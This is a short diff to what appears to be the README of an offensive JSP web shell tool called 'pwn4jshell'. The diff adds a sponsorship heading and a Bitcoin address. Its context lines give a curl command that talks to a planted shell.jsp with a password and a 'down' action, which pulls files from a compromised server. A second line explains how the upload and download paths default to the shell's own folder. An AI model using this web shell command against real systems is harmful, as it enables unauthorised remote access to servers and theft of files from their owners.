@@ -36,3 +36,8 @@ if the path is not set the file will be placed in the same dir as the shell.jsp
 curl "http://{ip}:8080/pwn4jshell/?pass=key&action=down&path={pathToFile}&args=shell.jsp" 
 
 same as upload if path is not set will try to download the file from the same dir as shell.jsp 
+
+
+## sponsor de project. 
+
+BTC: bc1qhzp6d5rtczyffwfaqxlca8cfqhc5m0xzarjy6ve8ujmxmgecmpeq08vppv
